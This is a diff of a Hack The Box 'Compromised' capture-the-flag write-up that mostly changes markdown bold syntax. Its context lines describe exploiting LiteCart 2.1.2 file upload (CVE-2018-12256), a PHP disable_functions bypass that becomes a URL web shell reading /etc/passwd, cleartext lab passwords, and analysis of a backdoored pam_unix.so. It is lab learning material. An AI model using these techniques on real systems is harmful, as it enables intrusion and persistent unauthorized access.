@@ -1,6 +1,6 @@
 ![](compromised_banner.png)
 
-<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="http://www.hackthebox.eu/badge/image/391067"></img></a>
+<p align="right">   <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" src="https://www.hackthebox.eu/badge/image/391067"></img></a>
 </p>
 
 # Scanning
@@ -19,7 +19,7 @@ PORT   STATE SERVICE VERSION
 
 ## Web_server
 
-webserver is running __[LiteCart](https://www.litecart.net/en/) CMS__ - A free online catalog and shopping cart platform developed in PHP.
+webserver is running **[LiteCart](https://www.litecart.net/en/) CMS** - A free online catalog and shopping cart platform developed in PHP.
 
 ### Gobuster
 
@@ -32,7 +32,7 @@ webserver is running __[LiteCart](https://www.litecart.net/en/) CMS__ - A free o
 
 ### /backup
 
-__Goto__ http://10.10.10.207/backup
+**Goto** http://10.10.10.207/backup
 
     Index of /backup
     Name  Last modified Size  Description
@@ -58,7 +58,7 @@ __Goto__ http://10.10.10.207/backup
         // Password Encryption Salt
         define('PASSWORD_SALT', 'kg1T5n2bOEgF8tXIdMnmkcDUgDqOLVvACBuYGGpaFkOeMrFkK0BorssylqdAP48Fzbe8ylLUx626IWBGJ00ZQfOTgPnoxue1vnCN1amGRZHATcRXjoc6HiXw0uXYD9mI');
 
-  __Found mysql database creds:__ `root:changethis`
+  **Found mysql database creds:** `root:changethis`
   * but this database is in the local so these creds are not useful and the password hash is salted so cracking this hash is wast of time so i move forward.
 
   * found a comment inside `admin/login.php` file -
@@ -76,16 +76,16 @@ __Goto__ http://10.10.10.207/backup
 
 ### admin login
 
-__Goto__ `http://10.10.10.207/shop/admin` redirect to admin login page `http://10.10.10.207/shop/admin/login.php?redirect_url=%2Fshop%2Fadmin%2F` 
+**Goto** `http://10.10.10.207/shop/admin` redirect to admin login page `http://10.10.10.207/shop/admin/login.php?redirect_url=%2Fshop%2Fadmin%2F` 
 
-* in the admin panel i got running __LiteCart__ version __2.1.2__
+* in the admin panel i got running **LiteCart** version **2.1.2**
 
 ### LiteCart Arbitrary File Upload (Authenticated) Exploit
 
-* searching on google for __LiteCart-2.1.2-Exploit__ i found a CVE
+* searching on google for **LiteCart-2.1.2-Exploit** i found a CVE
 
   Vulnerability Details : [CVE-2018-12256](https://nvd.nist.gov/vuln/detail/CVE-2018-12256)
-  * __Discription :__ admin/vqmods.app/vqmods.inc.php in LiteCart before 2.1.3 allows remote authenticated attackers to upload a malicious file (resulting in remote code execution) by using the text/xml or application/xml Content-Type in a public_html/admin/?app=vqmods&doc=vqmods request. 
+  * **Discription :** admin/vqmods.app/vqmods.inc.php in LiteCart before 2.1.3 allows remote authenticated attackers to upload a malicious file (resulting in remote code execution) by using the text/xml or application/xml Content-Type in a public_html/admin/?app=vqmods&doc=vqmods request. 
   * `shop/admin/vqmods.app/vqmods.inc.php` file is responsible for this vulnerability.
 
 #### Exploit surface
@@ -93,9 +93,9 @@ __Goto__ `http://10.10.10.207/shop/admin` redirect to admin login page `http://1
 * On the admin panel goto vQmods tab `http://10.10.10.207/shop/admin/?app=vqmods&doc=vqmods` here we can see a file upload option.
 * from the file upload option we can upload a php file insted of xml file by changing `Content-Type: application/x-php` to `Content-Type: application/xml` in the POST request and we can see that the file get uploaded, and thats the way we can get the remote code execution.
 
-__Why this happening -__
+**Why this happening -**
 
-in the litecart version 2.1.2 it validates the vQmods xml file by checking `Content-Type` in the file upload POST request and the `Content-Type` is ditermined by the file extention so when we upload xml file then the __Content-Type: text/xml__ and when we upload php file then the __Content-Type: application/x-php__
+in the litecart version 2.1.2 it validates the vQmods xml file by checking `Content-Type` in the file upload POST request and the `Content-Type` is ditermined by the file extention so when we upload xml file then the **Content-Type: text/xml** and when we upload php file then the **Content-Type: application/x-php**
 
 and in the litecart 2.1.2 source code of the `vqmods.inc.php` file:
 
@@ -114,18 +114,18 @@ so if we intercept the POST request and change the `Content-Type: application/x-
 ![](screenshots/dis-php-func.png)
 
   * I also find php version is `7.2.24-0ubuntu0.18.04.6`
-  * there is a __disable functions bypass vulnerability__ in the php version 7.0<7.3 and i can use that to bypass the disabled function and can execute shell commands but don't get shell.
+  * there is a **disable functions bypass vulnerability** in the php version 7.0<7.3 and i can use that to bypass the disabled function and can execute shell commands but don't get shell.
     * [PHP 7.0 < 7.3 (Unix) - 'gc' disable_functions Bypass](https://www.exploit-db.com/exploits/47462) - ExploitDB 
 
 * I just need to upload that disable_functions bypass exploit php file and change the `pwn` function input in line 17 `pwn("uname -a");` to a shell commands i want to execute and get output in the browser from `http://10.10.10.207/shop/vqmod/xml/bypass.php`
 
 * in the `pwn` function from exploit.php file i use `$_REQUEST` [superglobal variable](https://www.php.net/manual/en/reserved.variables.request.php)
 
-__super global variable__ `$_REQUEST` is used to collect the user input so we can use this variable to run commands from url field without uploading php file everytime
+**super global variable** `$_REQUEST` is used to collect the user input so we can use this variable to run commands from url field without uploading php file everytime
 
-__solving all scripts errors -__
+**solving all scripts errors -**
 
-__First__, change bypass.php `pwn` function input from shell command -
+**First**, change bypass.php `pwn` function input from shell command -
 
     pwn("uname -a");
 
@@ -133,7 +133,7 @@ to a global variable -
 
     pwn($_REQUEST['c']);
 
-__Second__, to solve ExploitDB's litecart exploit script we need to remove php shell from it -
+**Second**, to solve ExploitDB's litecart exploit script we need to remove php shell from it -
 
 ![](screenshots/before.png)
 
@@ -144,7 +144,7 @@ and load bypass.php file in it -
 
 ### USER:www-data shell
 
-__Run [litecart exploit script](scripts/litecart-exploitdb.py)__
+**Run [litecart exploit script](scripts/litecart-exploitdb.py)**
 
 `python litecart-exploitdb.py -t http://10.10.10.207/shop/admin/ -p 'theNextGenSt0r3!~' -u admin`
 ```
@@ -154,7 +154,7 @@ compromised
 www-data
 ```
 
-__From url shell__
+**From url shell**
 
 `http://10.10.10.207/shop/vqmod/xml/F8ALL.php?c=cat%20/etc/passwd`
 ```
@@ -221,7 +221,7 @@ uid=111(mysql) gid=113(mysql) groups=113(mysql)
 
 * there is a strace log file in the mysql directory -
 
-  __[Strace](https://strace.io/):__ strace is a powerful command line tool for debugging and trouble shooting programs in Unix-like operating systems such as Linux. It captures and records all system calls made by a process and the signals received by the process.
+  **[Strace](https://strace.io/):** strace is a powerful command line tool for debugging and trouble shooting programs in Unix-like operating systems such as Linux. It captures and records all system calls made by a process and the signals received by the process.
 
       mysql@compromised:~$ ls -la strace-log.dat
       -r--r----- 1 root mysql 787180 May 13  2020 strace-log.dat
@@ -257,7 +257,7 @@ uid=111(mysql) gid=113(mysql) groups=113(mysql)
 
   * this [file](https://github.com/x00tex/hackTheBox/blob/main/Boxes/linux/Retired/compromised/dump/pam_unix.so) created/modified(Aug 31) just before the box release(12 September 2020).
 
-* __[pam_unix](https://linux.die.net/man/8/pam_unix):__ It uses standard calls from the system's libraries to retrieve and set account information as well as authentication. Usually this is obtained from the /etc/passwd and the /etc/shadow file as well if shadow is enabled.
+* **[pam_unix](https://linux.die.net/man/8/pam_unix):** It uses standard calls from the system's libraries to retrieve and set account information as well as authentication. Usually this is obtained from the /etc/passwd and the /etc/shadow file as well if shadow is enabled.
 
 * one intresting thing i found while searching about this file is that this file also used in persistence compromised attack where attacker modified the file and backdoored it with a master password to access root witout any interruption and i also found a script for this at  [zephrax@github](https://github.com/zephrax/linux-pam-backdoor)
 
@@ -271,7 +271,7 @@ uid=111(mysql) gid=113(mysql) groups=113(mysql)
       sysadmin@10.10.10.207's password: 3*NLJE32I$Fe
       pam_unix.so                                                 100%  194KB 111.2KB/s   00:01
 
-* using __[Ghidra](https://ghidra-sre.org/)__ reverse engineering tool to disassemble the library -
+* using **[Ghidra](https://ghidra-sre.org/)** reverse engineering tool to disassemble the library -
 
       backdoor._0_8_ = 0x4533557e656b6c7a;
       backdoor._8_7_ = 0x2d326d3238766e;
